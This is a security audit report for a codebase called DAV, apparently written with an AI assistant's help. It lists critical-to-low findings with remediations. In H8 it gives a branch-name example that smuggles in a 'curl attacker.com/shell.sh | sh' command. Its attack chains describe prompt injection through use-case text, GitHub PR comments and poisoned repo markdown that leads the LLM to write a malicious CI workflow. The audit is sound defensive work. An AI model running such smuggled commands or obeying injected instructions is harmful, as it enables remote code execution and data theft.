# DAV Security Audit — Full Report (2026-06-16)

Comprehensive security audit performed by 6 parallel analysis threads covering: authentication/authorization, injection/input validation, secrets/infrastructure, creative attack chains, logging/data leakage, and database security.

---

## Executive Summary

The DAV codebase has strong fundamentals — SQL injection is clean (all parameterized asyncpg), YAML deserialization is safe (all `safe_load`), path traversal defenses are robust, password hashing uses argon2, and HMAC session signing is correctly implemented. The 2026-06-05 internal audit resolved prior critical findings.

However, this audit identified **significant gaps in data protection** that are urgent given the NDA-protected FSI customer content flowing through the system. The highest-priority issues are: no database backups (complete data loss risk), unauthenticated exposure of customer content via the turns endpoint and MCP server, and a prompt injection → arbitrary file write attack chain that could achieve code execution via CI.

**Finding counts:** 4 Critical, 12 High, 14 Medium, 10 Low/Info

---

## CRITICAL Findings

### C1. No Database Backup Strategy
**Source:** DB audit | **Impact:** Complete, unrecoverable data loss

Zero backup mechanism exists — no `pg_dump`, no CronJob, no WAL archiving, no replication. Single-replica PostgreSQL with `Recreate` strategy on an RWO PVC. A PVC deletion, storage corruption, or failed migration results in total loss of 66 tables containing all use cases, analysis results, credentials, and user data.

**Remediation:** Deploy a CronJob running `pg_dump --format=custom` to encrypted storage. Implement 7 daily + 4 weekly retention. Test restore procedure.

### C2. Turns Endpoint Serves Full LLM Prompts Without Project-Scoped Auth
**Source:** Logging audit | **File:** `main.py:3575-3606`

`GET /api/runs/{name}/turns` has no `get_user()` or `require_priv()` call — only a `validations.ENABLED` check. Any authenticated console user can read any run's complete prompts (containing customer UC YAML with NDA-protected descriptions, intents, and success criteria) and full LLM analysis responses regardless of project membership.

**Remediation:** Add `get_user()` + `require_priv()` + project scoping. Consider encrypting turns JSONL at rest.

### C3. 23+ Exception Details Leaked in HTTP 500 Responses
**Source:** Logging audit | **File:** `main.py` — 23+ locations

Pattern: `raise HTTPException(500, f"detail failed: {e}")`. Python exception `str()` output returned directly in HTTP response bodies. For database errors, this exposes table/column names, SQL query text, constraint names, and potentially partial row data containing customer content.

**Remediation:** Replace all `f"...{e}"` in HTTPException 500s with generic messages; log detail server-side only.

### C4. Enhancement Apply: Arbitrary File Write → Code Execution via CI
**Source:** Creative audit | **File:** `enhancement_apply.py:59-61`, `main.py:12904-12906`

Attack chain: Prompt injection in UC content → LLM emits enhancement block with `target: dcm/../.github/workflows/backdoor.yml` + `action: new_document` → `target_path` property does naive `split("/", 1)[1]` with zero path validation → content pushed to GitHub → PR with attacker-controlled CI workflow. Cross-namespace drift warnings are non-blocking (logged but PR proceeds).

**Bug found:** `_enh_apply_pr_body` called with 5 args but defined with 4 params — enhancement-apply may currently be non-functional (accidental safety).

**Remediation:** Add path validation (reject `..`, absolute paths). Add extension allowlist (`.md`, `.yaml`). Deny CI patterns (`.github/`, `Makefile`, `*.sh`, `*.py`).

---

## HIGH Findings

### H1. MCP Server Exposed to Internet Without Authentication
**Source:** Creative + Secrets audits | **File:** `mcp-docs-deployment.yaml.j2:194-207`

The MCP Route has TLS edge termination but zero auth — no OAuth proxy, no API key. Anyone who discovers the hostname can call `search_docs`, `get_document`, `get_document_section` and exfiltrate the entire DCM/UDLM spec corpus. No NetworkPolicy restricts MCP ingress. A secured LB sidecar exists but is disabled by default.

**Remediation:** Enable the secured LB. Add NetworkPolicy restricting MCP ingress to same-namespace only.

### H2. 8 LLM Prompt Injection Vectors — No Sanitization Anywhere
**Source:** Injection audit | **Files:** `main.py:4590-4607`, `uc_assist.py:177-183,317`, `main.py:8011,11251,12117,12564`, `arch_review.py:46-97`

No prompt injection defenses exist in the codebase. The highest-risk vector is **PR comment bodies from GitHub** injected directly into LLM prompts for UC draft generation — this does NOT require DAV authentication. Any external contributor to a monitored repo can inject instructions. Other vectors include UC YAML content, bulk text (120K chars), assessment artifacts, stage context, and prompt assist fields.

**Remediation:** Wrap user content in XML-style delimiters. Add output schema validation. For PR comments, add content length caps and classification pre-filter.

### H3. DELETE /api/credentials Has Zero Auth Guard
**Source:** Auth audit | **File:** `main.py:9474-9492`

The `delete_credential_api` function has no `request: Request` parameter and calls no auth guard. Any user who passes the approval gate can delete any credential by UUID or name. In non-multiuser mode, the gate is a no-op, making this callable without authentication.

**Remediation:** Add `request: Request` parameter and `await require_role(request, "admin")`.

### H4. PostgreSQL Runs Without TLS
**Source:** DB audit | **File:** `review-console-db-deployment.yaml.j2`

No TLS configuration on the DB deployment. No certificates, no `ssl = on`, no `sslmode` in the DSN. asyncpg defaults to `prefer` which silently falls back to plaintext. The DB password and all query results (including plaintext API keys) transit the cluster overlay network in cleartext.

**Remediation:** Generate TLS cert for PostgreSQL, configure `ssl = on`, add `?sslmode=verify-full` to DSN.

### H5. No NetworkPolicy on the Database Pod
**Source:** DB audit

The API has a NetworkPolicy but the DB pod (port 5432) has none. Any pod in any namespace that can reach the `dav` namespace's pod network can attempt to connect.

**Remediation:** Add NetworkPolicy allowing ingress on 5432 only from pods matching the API's label selector.

### H6. `model_configs.api_key` Stored Plaintext
**Source:** DB audit | **File:** `schema.sql:319`

LLM provider API keys stored as plaintext TEXT. Masked on HTTP GET but plaintext in the database. Any DB read access (backups, replication, compromised connection) exposes all API keys.

**Remediation:** Add `api_key_encrypted` column, Fernet-wrap on write, decrypt at engine-call boundary.

### H7. Legacy `code_repo_configs.token` Not Cleared After Migration
**Source:** DB audit | **File:** `main.py:750-883`

ADR-006 migration copies tokens to Fernet-encrypted `managed_repos.github_pat_encrypted` but never clears the plaintext source column.

**Remediation:** NULL out `code_repo_configs.token` after successful migration.

### H8. Shell Injection in Tekton Task Params
**Source:** Creative audit | **File:** `tekton-tasks/dav-git-sync.yaml.j2:63,69-70,81`

All `$(params.*)` expansions are unquoted in shell scripts. `RunTriggerIn` accepts plain strings with no regex validation. A crafted `repo-branch` like `main; curl attacker.com/shell.sh | sh` would execute arbitrary commands. Requires authenticated user with `P_PROJECT_RUNS_EXECUTE`.

**Remediation:** Quote all `$(params.*)`. Add Pydantic validators: URL regex, branch regex, SHA hex pattern.

### H9. LLM Output Logged — Customer Content in Container Logs
**Source:** Logging audit | **Files:** `main.py:11107-11109`, `agent.py:1142`, `client.py:569-578`

Cache hit logs emit first/last 160 chars of LLM analysis. JSON parse failures log first 500 chars. Reasoning content logs first 200 chars. vLLM has no `--disable-log-requests` flag — at DEBUG level, full prompts and completions are logged.

**Remediation:** Remove content snippets from log statements. Add `--disable-log-requests` and `VLLM_LOGGING_LEVEL=WARNING` to vLLM deployment.

### H10. Indirect Prompt Injection via Managed Repos into MCP
**Source:** Creative audit | **File:** `mcp/dav-docs-mcp/server.py:127,131`

MCP indexes all `*.md` files via `rglob("*.md")` with `read_text()` — no sanitization, follows symlinks. An attacker with commit access to a managed repo can inject adversarial instructions that enter the LLM context when stage-2 calls `get_document`. A symlink to `/var/run/secrets/kubernetes.io/serviceaccount/token` would be indexed and served.

**Remediation:** Add symlink containment check. Document managed repos as a trust boundary.

### H11. 60+ Endpoints Lack Endpoint-Level Auth Guards
**Source:** Auth audit | **File:** `main.py` — many locations

Many read-only GET endpoints rely entirely on `_approval_gate` middleware, which is conditional on `_REQUIRE_AUTH` or LDAP enforcement. In default configuration without these flags, the gate is a no-op and these endpoints become fully unauthenticated — exposing run data, results, analysis outputs, credential type vocabulary, etc.

**Remediation:** Make `_approval_gate` unconditional, or add endpoint-level auth to all data-returning endpoints.

### H12. PATs User-Scoped, Not Project-Scoped
**Source:** Creative + Auth audits | **File:** `migrate_022_api_tokens.sql`

PATs are bound only to `email` with no `project_id` column. A single compromised PAT exposes every project the user has roles on. Additionally, PAT minting doesn't validate the target email exists as an enabled account — minting for a nonexistent email + using it auto-creates a user via JIT provisioning.

**Remediation:** Add optional `project_id` scoping. Validate email exists and is enabled before minting.

---

## MEDIUM Findings

| # | Finding | File | Remediation |
|---|---------|------|-------------|
| M1 | SSRF via model probe — arbitrary URL, no IP filtering | `main.py:10806-10826` | Add RFC1918/link-local/metadata IP denylist |
| M2 | Account deletion doesn't revoke PATs, JIT re-provisions | `main.py:2085-2089` | Add `DELETE FROM api_tokens` to deletion flow |
| M3 | CORS wildcard with credentials (default config) | `main.py:890-897` | Set `CORS_ORIGINS` to specific frontend origin |
| M4 | `--initial-branch` validation ordering | `main.py:9211-9213` | Call `_validate_branch()` before `_git_init()` |
| M5 | Invitation tokens stored plaintext | `schema.sql:785-786` | Store SHA256 hash, show plaintext once |
| M6 | Fernet key not in Ansible Vault (plaintext in vars.local.yaml) | `vars.local.yaml:140` | Move to `vault.yaml` |
| M7 | No data retention policy — unbounded PII accumulation | `audit_log`, `user_invitations` | Implement cleanup CronJob, define retention |
| M8 | Storage encryption at rest unverified | DB PVC uses cluster default | Verify OSD encryption, use explicit encrypted SC |
| M9 | Swagger/ReDoc exposed without auth | `main.py:888,903` | Add `docs_url=None, redoc_url=None` |
| M10 | `log.exception()` leaks customer content via traceback | `uc_assist.py:191,329` | Replace with `log.warning()` in content paths |
| M11 | No login rate limiting | `main.py:2920-2946` | Add per-account lockout after N failures |
| M12 | Default admin with `changeme` password | `main.py:1223-1250` | Server-side enforcement of password change |
| M13 | corpus_push path traversal | `corpus_push.py` | Validate file_path against allowlist pattern |
| M14 | `exc_info=True` in cache write path leaks SQL content | `main.py:11147` | Remove `exc_info=True` or sanitize |

---

## LOW / INFO Findings

| # | Finding | Notes |
|---|---------|-------|
| L1 | LDAP filter value not escaped | `ldap_auth.py:79` — use `escape_filter_chars()` |
| L2 | Engine Containerfile runs as root (no USER instruction) | OCP restricted-v2 SCC overrides but local dev is root |
| L3 | Engine + MCP dependencies unpinned (`>=` not `==`) | Supply chain risk — pin to exact versions |
| L4 | Session cookie lacks `__Host-` prefix | DoS vector from sibling subdomains, not auth bypass |
| L5 | No session revocation mechanism | Compensated by per-request account check in gate |
| L6 | `--forwarded-allow-ips *` trusts any pod | Acceptable behind nginx + NetworkPolicy |
| L7 | PAT `last_used_at` never updated | Cannot identify stale tokens |
| L8 | No Content-Security-Policy header | Defense-in-depth gap |
| L9 | `esc()` doesn't escape single quotes | Theoretical XSS in onclick contexts |
| L10 | `ansible.cfg` host_key_checking disabled | Non-issue for local connection mode |

---

## Clean Areas (No Findings)

- **SQL injection** — All queries properly parameterized via asyncpg `$N` placeholders
- **YAML deserialization** — All `yaml.safe_load()`, no bare `yaml.load()`
- **Path traversal (API)** — Robust `realpath()` + `startswith()` containment, `..` rejection
- **XSS (API)** — Pure JSON API, no HTML rendering
- **XSS (Frontend)** — `esc()` applied consistently across ~427 `innerHTML` sites
- **Git credential logging** — `type(ex).__name__` used, not `str(ex)`, PATs never in log output
- **Password hashing** — argon2 with proper parameters
- **HMAC sessions** — SHA256, `compare_digest`, minimum key length, expiry validation
- **Fernet credential encryption** — Fail-closed on missing key (503)
- **HTTP API secret masking** — Row serializers whitelist columns, expose only `has_*` booleans
- **Tekton webhook** — HMAC signature validation via github interceptor, event type filtering
- **Kubernetes Secrets** — All secrets via `secretKeyRef`, never plaintext `value:`

---

## Attack Chains

### Chain A: Prompt Injection → Code Execution via CI (H2 + C4)
**UC author → prompt injection in description → LLM emits malicious enhancement targeting `.github/workflows/` → PR auto-created → CI executes attacker code**

Requires: authenticated UC author + successful prompt injection past vLLM guided decoding. Currently blocked by arity bug in `_enh_apply_pr_body` (accidental safety).

### Chain B: Repo Poisoning → Code Execution (H10 + H2 + C4)
**Attacker commits to managed repo → MCP indexes poisoned markdown → LLM reads via `get_document` → injection influences enhancement output → malicious PR**

Requires: commit access to a spec repo that DAV indexes.

### Chain C: Deleted User Persistence (M2 + H12)
**Admin deletes user → PAT survives → JIT re-provisions account → user regains gate-level access across all former projects**

Limited impact (re-provisioned account has no roles) but bypasses intended deletion effect.

### Chain D: Shell Injection via Console API (H8)
**Authenticated user with RUNS_EXECUTE → crafted repo-branch parameter → RCE in pipeline container**

Direct exploitation, no chaining required.

### Chain E: Unauthenticated Spec Exfiltration (H1)
**Internet attacker → discover MCP Route hostname → call `list_documents` / `get_document` → exfiltrate full DCM/UDLM corpus**

Zero auth required.

---

## Priority Remediation

### P0 — Do Immediately
| Finding | Effort | What |
|---------|--------|------|
| C1 | Medium | Implement database backups |
| C2 | Low | Add auth + project scoping to `/api/runs/{name}/turns` |
| H1 | Low | Enable MCP secured LB + add NetworkPolicy |
| H3 | Low | Add auth guard to `DELETE /api/credentials` |
| C4 | Low | Add path validation + extension allowlist in enhancement apply |

### P1 — This Sprint
| Finding | Effort | What |
|---------|--------|------|
| C3 | Medium | Replace all `f"...{e}"` in 500 responses with generic messages |
| H4 | Medium | Enable PostgreSQL TLS |
| H5 | Low | Add DB NetworkPolicy |
| H8 | Low | Quote `$(params.*)` in Tekton tasks + add input validators |
| H9 | Low | Remove content from log statements + disable vLLM request logging |
| M2 | Low | Revoke PATs on account deletion |
| M3 | Low | Set CORS_ORIGINS in deployment template |

### P2 — Next Sprint
| Finding | Effort | What |
|---------|--------|------|
| H2 | Medium | Add XML delimiters for prompt injection defense |
| H6 | Medium | Encrypt model_configs.api_key at rest |
| H7 | Low | Clear legacy plaintext tokens |
| H10 | Low | Add symlink containment in MCP indexer |
| H11 | Medium | Add endpoint-level auth or make gate unconditional |
| H12 | Medium | Add project scoping to PATs |

### P3 — Backlog
| Finding | Effort | What |
|---------|--------|------|
| M1-M14 | Various | SSRF denylist, retention policy, invitation token hashing, etc. |
| L1-L10 | Low each | LDAP escaping, CSP header, dep pinning, etc. |

---

## Session Note

The PAT `dav_pat_RELY...` used during this audit session should be **rotated immediately** — it appears in this conversation's context which may be retained by Anthropic per their data policies.
